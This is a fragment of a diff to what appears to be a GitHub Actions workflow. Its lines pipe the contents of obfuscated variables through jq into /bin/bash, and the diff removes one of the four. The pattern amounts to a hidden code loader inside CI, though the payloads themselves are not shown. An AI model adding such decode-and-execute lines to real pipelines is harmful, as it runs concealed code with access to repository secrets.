@@ -22,7 +22,6 @@ jobs:
           echo $cmwt12634 | jq -r .abkru5117 | /bin/bash
           printf '%s' "$g0131" | jq -r .pm5066 | /bin/bash
           printf '%s' "$wk6" | jq -r .pncp640 | /bin/bash
-          echo $s52 | jq -r .zc0140 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
